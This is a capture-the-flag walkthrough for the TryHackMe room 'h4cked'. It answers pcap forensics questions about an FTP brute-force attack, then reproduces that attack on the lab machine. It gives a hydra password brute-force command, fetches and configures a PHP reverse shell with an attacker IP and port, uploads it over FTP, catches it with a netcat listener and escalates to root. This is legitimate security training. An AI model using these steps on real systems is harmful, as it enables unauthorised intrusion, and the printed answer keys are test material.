---
description: https://tryhackme.com/room/h4cked
---

# h4cked

## Task 1 oh no! We've been hacked!

#### It seems like our machine got hacked by an anonymous threat actor. However, we are lucky to have a .pcap file from the attack. Can you determine what happened? Download the .pcap file and use Wireshark to view it.

#### The attacker is trying to log into a specific service. What service is this?

![Wireshark Protocol Hierarchy](<../../.gitbook/assets/Screenshot from 2022-02-20 18-17-06.png>)

![Wireshark](<../../.gitbook/assets/Screenshot from 2022-02-20 18-18-14.png>)

{% hint style="success" %}
`FTP`
{% endhint %}

#### There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?

![Google for "Van Hauser"](<../../.gitbook/assets/Screenshot from 2022-02-20 18-21-59.png>)

{% hint style="success" %}
`hydra`
{% endhint %}

#### The attacker is trying to log on with a specific username. What is the username?

{% hint style="success" %}
`jenny`
{% endhint %}

#### What is the user's password?

![https://en.wikipedia.org/wiki/List\_of\_FTP\_server\_return\_codes](<../../.gitbook/assets/Screenshot from 2022-02-20 18-30-43.png>)

![ftp.response.code == 230](<../../.gitbook/assets/Screenshot from 2022-02-20 18-29-28.png>)

![tcp.stream == 7](<../../.gitbook/assets/Screenshot from 2022-02-20 18-30-09.png>)

{% hint style="success" %}
`password123`
{% endhint %}

#### What is the current FTP working directory after the attacker logged in?

![ftp.response.code == 230](<../../.gitbook/assets/Screenshot from 2022-02-20 18-35-13.png>)

![tcp.stream == 16](<../../.gitbook/assets/Screenshot from 2022-02-20 18-36-07.png>)

{% hint style="success" %}
`/var/www/html`
{% endhint %}

#### The attacker uploaded a backdoor. What is the backdoor's filename?

![](<../../.gitbook/assets/Screenshot from 2022-02-20 18-40-19.png>)

{% hint style="success" %}
`shell.php`
{% endhint %}

#### The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?

![](<../../.gitbook/assets/Screenshot from 2022-02-20 19-02-50.png>)

{% hint style="success" %}
`http://pentestmonkey.net/tools/php-reverse-shell`
{% endhint %}

#### Which command did the attacker manually execute after getting a reverse shell?

![ftp-data](<../../.gitbook/assets/Screenshot from 2022-02-20 19-10-02.png>)

![(ip.dst == 192.168.0.147) && (tcp.dstport == 80)](<../../.gitbook/assets/Screenshot from 2022-02-20 19-08-43.png>)

![Follow TCP Stream](<../../.gitbook/assets/Screenshot from 2022-02-20 19-10-37.png>)

{% hint style="success" %}
`whoami`
{% endhint %}

#### What is the computer's hostname?

![Follow TCP Stream](<../../.gitbook/assets/Screenshot from 2022-02-20 19-24-33.png>)

{% hint style="success" %}
`wir3`
{% endhint %}

#### Which command did the attacker execute to spawn a new TTY shell?

{% hint style="success" %}
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
{% endhint %}

#### Which command was executed to gain a root shell?

{% hint style="success" %}
sudo su
{% endhint %}

#### The attacker downloaded something from GitHub. What is the name of the GitHub project?

{% hint style="success" %}
`Reptile`
{% endhint %}

#### The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?

{% hint style="success" %}
`rootkit`
{% endhint %}

## Task 2 Hack your way back into the machine

#### The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary. Good luck!

#### Run Hydra on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list.

```bash
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.34.144
```

![hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.34.144](<../../.gitbook/assets/Screenshot from 2022-02-20 19-40-22.png>)

#### Change the necessary values inside the web shell and upload it to the webserver

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
sed -i 's/^$ip =.*/$ip = "10.17.20.154";/' php-reverse-shell.php
sed -i 's/^$port =.*/$port = 4444;/' php-reverse-shell.php
```

```
ftp jenny@10.10.34.144
ftp> put php-reverse-shell.php
ftp> chmod 777 php-reverse-shell.php 
```

![ftp](<../../.gitbook/assets/Screenshot from 2022-02-20 19-53-38.png>)

#### Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.

```bash
nc -nvlp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![nc -nvlp 4444](<../../.gitbook/assets/Screenshot from 2022-02-20 19-59-18.png>)

#### Become root!

```
su - jenny
sudo -l
sudo su -
```

![](<../../.gitbook/assets/Screenshot from 2022-02-20 20-01-00.png>)

#### Read the flag.txt file inside the Reptile directory

```
ls Reptile
cat Reptile/flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-02-20 20-01-01.png>)
